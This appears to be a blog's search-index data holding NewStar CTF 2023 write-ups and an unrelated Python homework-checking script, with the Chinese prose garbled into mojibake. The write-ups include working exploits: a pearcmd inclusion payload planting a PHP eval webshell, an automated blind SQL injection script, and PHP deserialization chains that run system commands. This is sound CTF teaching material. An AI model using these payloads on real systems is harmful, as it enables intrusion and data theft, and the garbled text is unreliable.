bytes.fromhex(&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;)for i in range(256):    if b&#x27;flag&#x27; in xor(bytes([i]), ciphertext):        print(xor(bytes([i]), ciphertext))\n\nbabyaesé¢˜ç›®ï¼š\nfrom Crypto.Cipher import AESimport os# from flag import flagfrom Crypto.Util.number import *def pad(data):    return data + b&quot;&quot;.join([b&#x27;\\x00&#x27; for _ in range(0, 16 - len(data))])def main():    flag_ = pad(flag)    key = os.urandom(16) * 2    iv = os.urandom(16)    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)    aes = AES.new(key, AES.MODE_CBC, iv)    enc_flag = aes.encrypt(flag_)    print(enc_flag)if __name__ == &quot;__main__&quot;:    main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;\n\nè§£é¢˜aesï¼Œæˆ‘ä»¬éœ€è¦å¯†ç keyï¼Œåç§»é‡ivï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼ŒåŠ å¯†æ¨¡å¼æ˜¯AES-CBC\nfrom Crypto.Cipher import AESimport os# from flag import flagfrom Crypto.Util.number import *def main():    xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229 ^ 1    print(xor)    out = long_to_bytes(xor)    key = out[:16] * 2    print(key)    iv = bytes_to_long(key[16:]) ^ bytes_to_long(out[16:])    iv = long_to_bytes(iv)    print(iv)    ciphertext = b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;    cipher = AES.new(key, AES.MODE_CBC, iv)    flag = cipher.decrypt(ciphertext)    print(flag)if __name__ == &quot;__main__&quot;:    main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"NewStar2023 Week3","url":"/NewStar2023-WriteUp-Week3/","content":"week3webInclude ğŸé¢˜ç›®ï¼š\n &lt;?php    error_reporting(0);    if(isset($_GET[&#x27;file&#x27;])) &#123;        $file = $_GET[&#x27;file&#x27;];                if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123;            die(&#x27;hacker!&#x27;);        &#125;                include($file.&quot;.php&quot;);        # Something in phpinfo.php!    &#125;    else &#123;        highlight_file(__FILE__);    &#125;?&gt; \n\næ ¹æ®æç¤ºæ‰“å¼€phpinfo.php &#x3D;&gt; ?file=phpinfo, æœç´¢flag\n\næ ¹æ®æç¤ºæœç´¢register_argc_argv, å‘ç°ä¸ºOn\n\nç»“åˆé¢˜ç›®æç¤ºğŸï¼Œåº”è¯¥æ˜¯åˆ©ç”¨pearcmdæ–‡ä»¶åŒ…å«\næ„é€ payload\n?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php\n\nè¿›è¡ŒPOSTæŸ¥çœ‹flag\n?file=/tmp/cmd#POST0 = system(&quot;cat /flag&quot;);\n\n\nå‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/RABCDXB/article/details/122050370\nmedium_sqlæµ‹è¯•åˆ¤æ–­æ˜¯å¦å­˜åœ¨å¸ƒå°”ç›²æ³¨ # è¦ç¼–ç ä¸º%23\n?id=TMP0919&#x27;And if(1&gt;0,1,0)%23?id=TMP0919&#x27;And if(0&gt;1,1,0)%23\n\nå‰è€…å¯ä»¥è¿”å›æ­£å¸¸çš„ä¿¡æ¯id: TMP0919ï¼Œåè€…ä¼šè¿”å›id not exists  \næ³¨æ„ç”¨å¤§å°å†™ç»•è¿‡è¢«è¿‡æ»¤çš„å­—ç¬¦\nimport timeimport requestsdef db_length(str, url):    print(&quot;[-] æµ‹è¯•æ•°æ®åº“é•¿åº¦.......&quot;)    num = 1    while True:        payload = url + f&quot;&#x27;%20And%20lengTh(daTabase())=&#123;num&#125;%23&quot;        # print(payload)        r = requests.get(url=payload)        time.sleep(0.1)        # print(r.text)        if str in r.text:            db_length = num            print(f&quot;[+] æ•°æ®åº“é•¿åº¦ï¼š&#123;db_length&#125;&quot;)            db_name(db_length)            break        else:            num += 1def db_name(db_length):    print(&quot;[-] æµ‹è¯•æ•°æ®åº“å.......&quot;)    strascii = &quot;qwertyuioplkjhgfdsazxcvbnm1234567890&quot;    tmp = &quot;&quot;    for i in range(1, db_length + 1):        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr(dAtabase(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            # print(payload)            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                print(tmp)    print(f&quot;[+] æ•°æ®åº“åï¼š&#123;tmp&#125;&quot;)    table_name()def table_name():    print(&quot;[-] æµ‹è¯•æ•°æ®åº“ è¡¨å.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;    tmp = &quot;&quot;    for i in range(25):  # å‡å®šè¡¨çš„é•¿åº¦ä¸º25        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                # print(tmp)    print(f&quot;[+] æ•°æ®åº“ è¡¨åï¼š&#123;tmp&#125;&quot;)    table_columns()def table_columns():  # æ­¤å‡½æ•°æ˜¯åœ¨æµ‹è¯•å¤„æ•°æ®åº“è¡¨ååæ‰å†™å‡ºï¼Œå› è€ŒçŸ¥é“è¡¨åâ€œgrades,here_is_flagâ€    print(&quot;[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;    tmp = &quot;&quot;    for i in range(10):  # å‡å®šåˆ—åé•¿åº¦ä¸º10        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                print(tmp)    print(f&quot;[+] æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯ï¼š&#123;tmp&#125;&quot;)    information_flag()def information_flag():    print(&quot;[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­æ•°æ®.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &#123;&#125;&quot;    tmp = &quot;&quot;    for i in range(50):          for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20flag%20fRom%20here_is_flag),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                # print(tmp)    print(f&quot;[+] æ•°æ®åº“è¡¨ä¸­æ•°æ®ï¼š&#123;tmp&#125;&quot;)if __name__ == &#x27;__main__&#x27;:    url = &#x27;http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919&#x27;    str = &#x27;Physics&#x27;    db_length(str, url)\n\næ³¨æ„ï¼šä¸Šè¿°è„šæœ¬æ²¡æœ‰ä½¿ç”¨ç®—æ³•ï¼Œç›´æ¥éå†è·å¾—ç›¸å…³ä¿¡æ¯ï¼Œå› è€Œè¿è¡Œæ—¶é—´è¾ƒé•¿ï¼Œå„ä½å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ä»£ç \n\nPOP Gadgeté¢˜ç›®ï¼š\n &lt;?phphighlight_file(__FILE__);class Begin&#123;    public $name;    public function __destruct()    &#123;        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;            echo &quot;Hello&quot;;        &#125;else&#123;            echo &quot;Welcome to NewStarCTF 2023!&quot;;        &#125;    &#125;&#125;class Then&#123;    private $func;    public function __toString()    &#123;        ($this-&gt;func)();        return &quot;Good Job!&quot;;    &#125;&#125;class Handle&#123;    protected $obj;    public function __call($func, $vars)    &#123;        $this-&gt;obj-&gt;end();    &#125;&#125;class Super&#123;    protected $obj;    public function __invoke()    &#123;        $this-&gt;obj-&gt;getStr();    &#125;    public function end()    &#123;        die(&quot;==GAME OVER==&quot;);    &#125;&#125;class CTF&#123;    public $handle;    public function end()    &#123;        unset($this-&gt;handle-&gt;log);    &#125;&#125;class WhiteGod&#123;    public $func;    public $var;    public function __unset($var)    &#123;        ($this-&gt;func)($this-&gt;var);        &#125;&#125;@unserialize($_POST[&#x27;pop&#x27;]); \n\n\n&#x2F;&#x2F;ç›®çš„æ˜¯è§¦å‘readfile(â€œ&#x2F;flagâ€)å‡½æ•°\n&#x2F;&#x2F;éœ€è¦è§¦å‘WihteGod-&gt;__unset()æ–¹æ³• å°±å¿…é¡»é€šè¿‡unset(WihteGod()) \n&#x2F;&#x2F;éœ€è¦unset(WihteGod()) å°±å¿…é¡»é€šè¿‡CTF-&gt;end()\n&#x2F;&#x2F;éœ€è¦CTF-&gt;end() å°±å¿…é¡»é€šè¿‡Handle-&gt;__call()\n&#x2F;&#x2F;éœ€è¦Handle-&gt;__call() å°±å¿…é¡»é€šè¿‡Handle-&gt;ä¸å­˜åœ¨çš„å‡½æ•° ä¹Ÿå°±æ˜¯Handle-&gt;getStr()   â€”callæ˜¯é­”æœ¯æ–¹æ³•çš„ä¸€ä¸ªï¼Œå½“ç¨‹åºè°ƒç”¨åˆ°å½“å‰ç±»ä¸­æœªå£°æ˜æˆ–æ²¡æƒé™è°ƒç”¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨â€”callæ–¹æ³•\n&#x2F;&#x2F;éœ€è¦Handle-&gt;getStr() å°±å¿…é¡»é€šè¿‡Super-&gt;__invoke() \n&#x2F;&#x2F;éœ€è¦Super-&gt;__invoke() å°±å¿…é¡»é€šè¿‡(Super)()è¢«å½“åšå‡½æ•°è°ƒç”¨â€”invoke()ï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œâ€”invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚\n&#x2F;&#x2F;éœ€è¦(Super)() å°±å¿…é¡»é€šè¿‡Then-&gt;__toString()\n&#x2F;&#x2F;éœ€è¦Then-&gt;__toString() å°±å¿…é¡»Thenè¢«å½“åšå­—ç¬¦ä¸²\n&#x2F;&#x2F;éœ€è¦Thenè¢«å½“åšå­—ç¬¦ä¸² å°±å¿…é¡»é€šè¿‡Begin-&gt;__destruct()\n\nç”±é¢˜ç›®å¾—çŸ¥ï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯è¦æƒ³åŠæ³•è§¦å‘WhiteGod-&gt;__unset()æ–¹æ³•ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé€šè¿‡æ„é€ **WhiteGod(func,cmd)**ç±»ï¼Œä¼ å…¥éœ€è¦æ‰§è¡Œçš„å‡½æ•°å’Œå‘½ä»¤ï¼ˆä¾‹å¦‚system(&quot;ls&quot;)ï¼‰ã€‚\nè¦è§¦å‘WhiteGod-&gt;__unset()æ–¹æ³•ï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ªunset(WhiteGod-&gt;ä¸å­˜åœ¨)ï¼Œä¹Ÿå°±æ˜¯**CTF(WhiteGod(func,cmd))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘CTF-&gt;end()ã€‚\nè¦è§¦å‘CTF-&gt;end()æ–¹æ³•ï¼Œå°±åªèƒ½é€šè¿‡Handle(CTF)ï¼Œä¹Ÿå°±æ˜¯**Handle(CTF(WhiteGod(func,cmd)))**ã€‚å¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘Handle-&gt;__call()ã€‚\nè¦è§¦å‘Handle-&gt;__call()æ–¹æ³•ï¼Œå°±éœ€è¦å‡ºç°Handle-&gt;ä¸å­˜åœ¨ï¼Œå³Handle-&gt;ä¸å­˜åœ¨getStr()ï¼Œä¹Ÿå°±æ˜¯**Super(Handle(CTF(WhiteGod(func,cmd))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘Super-&gt;__invoke()ã€‚\nè¦è§¦å‘Super-&gt;__invoke()æ–¹æ³•ï¼Œå°±éœ€è¦å‡ºç°(Super)();å³Superè¢«å½“åšå‡½æ•°åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘Then-&gt;__toString()æ–¹æ³•ã€‚\nè¦è§¦å‘Then-&gt;__toString()æ–¹æ³•ï¼Œå°±éœ€è¦Thenè¢«å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œå³Begin()-&gt;__destruct()ä¸­çš„æ­£åˆ™ã€‚ä¹Ÿå°±æ˜¯Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))\nè¿™æ ·ï¼Œå®Œæ•´çš„POPé“¾å°±æ„é€ å‡ºæ¥äº†\n\nç¼–å†™Exp\n&lt;?phpuse Begin as GlobalBegin;use Then as GlobalThen;class Begin&#123;    public $name;    public function __construct($a)    &#123;        $this-&gt;name = $a;    &#125;&#125;class Then&#123;    private $func;    public function __construct($a)    &#123;        $this-&gt;func = $a;    &#125;&#125;class Handle&#123;    protected $obj;    public function __construct($a)    &#123;        $this-&gt;obj = $a;    &#125;&#125;class Super&#123;    protected $obj;    public function __construct($a)    &#123;        $this-&gt;obj = $a;    &#125;&#125;class CTF&#123;    public $handle;    public function __construct($a)    &#123;        $this-&gt;handle = $a;    &#125;&#125;class WhiteGod&#123;    public $func;    public $var;    public function __construct($a, $b)    &#123;        $this-&gt;func = $a;        $this-&gt;var = $b;    &#125;&#125;$obj = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(&quot;readfile&quot;,&quot;/flag&quot;))))) );echo urlencode(serialize($obj));?&gt;\n\n\nR!!!C!!!E!!!é¢˜ç›®ï¼š\n &lt;?phphighlight_file(__FILE__);class minipop&#123;    public $code;    public $qwejaskdjnlka;    public function __toString()    &#123;        if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123;            exec($this-&gt;code);        &#125;        return &quot;alright&quot;;    &#125;    public function __destruct()    &#123;        echo $this-&gt;qwejaskdjnlka;    &#125;&#125;if(isset($_POST[&#x27;payload&#x27;]))&#123;    //wanna try?    unserialize($_POST[&#x27;payload&#x27;]);&#125; \n\nè§‚å¯Ÿæºç ï¼Œå…¸å‹çš„phpåºåˆ—åŒ–ï¼Œè§‚å¯Ÿé¢˜ç›®ï¼Œè¿™åˆæ˜¯ä¸€é“rceçš„é¢˜ç›®ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡teeå‘½ä»¤-&gt;æŠŠæ‰§è¡Œçš„å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶æ¥çœ‹åˆ°å›æ˜¾å†…å®¹\n&lt;?phpclass minipop&#123;    public $code=&quot;ls / | t&#x27;&#x27;ee a&quot;;    public $qwejaskdjnlka;&#125;$a = new minipop();$b = new minipop();$b-&gt;qwejaskdjnlka = $a;echo urlencode(serialize($b));?&gt;\n\nO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7Dæ³¨æ„å°†+ æ¢æˆ%20\næ¥ç€è®¿é—®url/a\n\nå‘ç°flagçš„è—èº«ä¹‹åœ°\n&lt;?phpclass minipop&#123;    public $code=&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee b&quot;;    public $qwejaskdjnlka;&#125;$a = new minipop();$b = new minipop();$b-&gt;qwejaskdjnlka = $a;echo urlencode(serialize($b));?&gt;\n\nè®¿é—®url&#x2F;b å‡ºç°flag\n\nGenShinæŠ“åŒ…å‘ç°ï¼š&#x2F;secr3tofpop\n\næ‰“å¼€å‘ç° éœ€è¦é€šè¿‡getç»™nameä¼ å‚\n\nå‘ç°ç»™nameä¼ ä»€ä¹ˆï¼Œé¡µé¢å°±å›æ˜¾ä»€ä¹ˆï¼Œé¦–å…ˆå°è¯•äº†phpä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæµ‹è¯•å¤±è´¥ï¼Œåœ¨æŸ¥è¯¢èµ„æ–™åå‘ç°ä¸UNCTF2020çš„easyflaské¢˜ç›®å¾ˆç›¸ä¼¼ï¼ŒçŒœæµ‹æ˜¯æ¨¡ç‰ˆæ³¨å…¥ï¼Œé¦–å…ˆå°è¯•**{{%print(7*7)%}}**,å‘ç°åº”è¯¥æ˜¯&#96;\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"Python Homework Checker","url":"/Python-Homework-Checker/","content":"Python Homework Checker(æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š)â€‹          ç°åœ¨ä¸€èˆ¬çš„ä½œä¸šéƒ½æ˜¯ç½‘ä¸Šæäº¤æ–‡ä»¶ä¸ºä¸»ï¼Œæˆ‘ä»¬æ€»ä¼šæœ‰ä¸€äº›ä½œä¸ºæ”¶ä½œä¸šçš„äººä¼šçƒ¦æ¼è°è¿˜æ²¡äº¤ä½œä¸šï¼Œæ‰€ä»¥æˆ‘å°±è¿™ä¸ªé—®é¢˜å†™äº†ä¸€æ®µå°ä»£ç æ¥æ£€æµ‹å“ªä¸ªäººæ²¡äº¤ä½œä¸šã€‚ \nâ€‹           åŸç†æ˜¯è¯»å…¥ä½œä¸šæ‰€åœ¨çš„æ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶åç§°ï¼Œå°†è¿™äº›æ–‡ä»¶åç§°å’Œä½ è¦æ”¶é›†çš„åå•å¯¹æ¯”ï¼Œå°†æ²¡æœ‰çš„åå•è¾“å‡º ä»¥ä¸‹æ˜¯ä¸€ä¸ªç”¨Pythonæ£€æŸ¥å­¦ç”Ÿæ˜¯å¦æäº¤ä½œä¸šçš„ç¨‹åºï¼Œå®ƒå¯ä»¥æ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶ï¼Œä»¥ç¡®å®šå“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸šã€‚æœ¬ç¨‹åºä½¿ç”¨openpyxlå’Œosåº“ï¼Œå› æ­¤éœ€è¦ç¡®ä¿å®‰è£…äº†è¿™ä¸¤ä¸ªåº“ã€‚ \nâ€‹          å¦‚æœExcelæ–‡ä»¶ä¸­æœ‰å¤šåˆ—ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ—æ ‡é¢˜æ¥æŸ¥æ‰¾å­¦å·æ‰€åœ¨çš„åˆ—ã€‚æˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®å­¦å·æ¥æå–å§“åï¼Œå› ä¸ºæ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶åæ˜¯â€œå­¦å·-å§“åâ€æ ¼å¼ã€‚ \nâ€‹          è¿™ä¸ªç¨‹åºé¦–å…ˆæŸ¥æ‰¾Excelæ–‡ä»¶ä¸­åŒ…å«â€œå­¦å·â€æ ‡é¢˜çš„åˆ—ï¼Œå¹¶è®°å½•è¯¥åˆ—çš„åˆ—å­—æ¯ã€‚ç„¶åå®ƒéå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œå¯¹äºæ¯ä¸ªPDFæ–‡ä»¶ï¼Œå®ƒä¼šæå–å­¦ç”Ÿå­¦å·å’Œå§“åï¼Œå¹¶å°†å­¦å·å’Œå§“åæ·»åŠ åˆ°å·²æäº¤å­—å…¸ä¸­ã€‚ç„¶åå®ƒéå†Excelæ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œï¼Œä½¿ç”¨å­¦å·åˆ—çš„åˆ—å­—æ¯æ¥æå–å­¦ç”Ÿå­¦å·ï¼Œå¹¶ä½¿ç”¨å­¦å·åœ¨å·²æäº¤å­—å…¸ä¸­æŸ¥æ‰¾å¯¹åº”çš„å§“åï¼Œå¹¶æ‰“å°å‡ºç›¸åº”çš„æäº¤çŠ¶æ€ã€‚ \nä»£ç å¤ç°import openpyxlimport os# å®šä¹‰æ–‡ä»¶å¤¹è·¯å¾„å’ŒExcelæ–‡ä»¶è·¯å¾„folder_path = &quot;D:\\\\University\\\\Sophomore_second\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–&quot;excel_path = &quot;D:\\\\University\\\\Sophomore_second\\\\R222A1035120001å·¥ç¨‹é¡¹ç›®ç®¡ç†ä¸ç»æµå†³ç­–\\\\R222A1035120001å­¦ç”Ÿåå•0310.xlsx&quot;# æ‰“å¼€Excelæ–‡ä»¶wb = openpyxl.load_workbook(excel_path)sheet = wb.active# åˆ›å»ºä¸€ä¸ªç©ºçš„å­—å…¸æ¥å­˜å‚¨å·²ç»æäº¤ä½œä¸šçš„å­¦ç”Ÿå­¦å·submitted = &#123;&#125;# æŸ¥æ‰¾Excelæ–‡ä»¶ä¸­å­¦å·æ‰€åœ¨çš„åˆ—headers = [cell.value for cell in sheet[1]]if &quot;å­¦å·&quot; not in headers:    print(&quot;Error: cannot find the column containing student IDs.&quot;)    exit()student_id_column = headers.index(&quot;å­¦å·&quot;) + 1# éå†æ–‡ä»¶å¤¹ä¸­çš„PDFæ–‡ä»¶ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶for filename in os.listdir(folder_path):    if filename.endswith(&quot;.pdf&quot;):        student_id, student_name = filename[:-4].rsplit(&quot;-&quot;, 1) # åˆ†ç¦»å­¦å·å’Œå§“å        submitted[student_id] = student_name# éå†Excelæ–‡ä»¶ä¸­çš„å­¦ç”Ÿåå•ï¼Œæ£€æŸ¥å“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸šfor row in sheet.iter_rows(min_row=2, values_only=True):    student_id = str(row[student_id_column - 1])    if student_id in submitted:        pass    else:        print(f&quot;&#123;row[1]&#125; (&#123;student_id&#125;) has not submitted the homework.&quot;)\n","categories":["python"],"tags":["python","excel","openpyxl","os"]},{"title":"NewStar2023 WriteUp Week4","url":"/NewStar2023-WriteUp-Week4/","content":"week4webé€ƒé¢˜ç›®ï¼š\n &lt;?phphighlight_file(__FILE__);function waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key;    public $cmd = &quot;whoami&quot;;    public function __construct($key)    &#123;        $this-&gt;key = $key;    &#125;    public function __destruct()    &#123;        system($this-&gt;cmd);    &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data \n\nç»å…¸çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\né¦–å…ˆæ„é€ åºåˆ—åŒ–ä»£ç ï¼š\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;bad&#x27;;       public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;bad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\næˆ‘ä»¬éœ€è¦é€ƒé€¸çš„æ˜¯&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\n\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:24:&quot;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\næ€»å…±24ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å†™24ä¸ªbadå°±è¡Œ\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;$res = waf(serialize($a));echo $res.&quot;\\n&quot;;$c = unserialize($res);print_r($c).&quot;\\n&quot;;echo $c-&gt;cmd;\n\nè¿è¡Œç»“æœï¼š\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;GetFlag Object(    [key] =&gt; goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood    [cmd] =&gt; ls /)ls /\n\npayloadï¼š\nkey = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot; \n\næ¥ç€æ„é€ payloadæŸ¥çœ‹flag\n/?key=.badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;\n\nMore Fasté¢˜ç›®ï¼š\n &lt;?phphighlight_file(__FILE__);class Start&#123;    public $errMsg;    public function __destruct() &#123;        die($this-&gt;errMsg);    &#125;&#125;class Pwn&#123;    public $obj;    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125;class Reverse&#123;    public $func;    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125;class Web&#123;    public $func;    public $var;    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125;class Crypto&#123;    public $obj;    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125;class Misc&#123;    public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125;$a = @unserialize($_POST[&#x27;fast&#x27;]);throw new Exception(&quot;Nope&quot;);Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 &#123;main&#125; thrown in /var/www/html/index.php on line 55\n\né¦–å…ˆå°±æ˜¯æ„é€ popé“¾ï¼š\n\n&#x2F;&#x2F;ç›®çš„æ˜¯è§¦å‘Webä¸­çš„evilå‡½æ•° æ‰§è¡Œ system (cat &#x2F;f*)\n&#x2F;&#x2F;éœ€è¦è§¦å‘Web-&gt;evil()å‡½æ•° å°±éœ€è¦è§¦å‘Pwnä¸­çš„__invoke()æ–¹æ³•\n&#x2F;&#x2F;éœ€è¦è§¦å‘Pwnä¸­çš„__invoke()æ–¹æ³• å°±éœ€è¦è§¦å‘Reverseä¸­çš„__get()æ–¹æ³• â€“&gt; 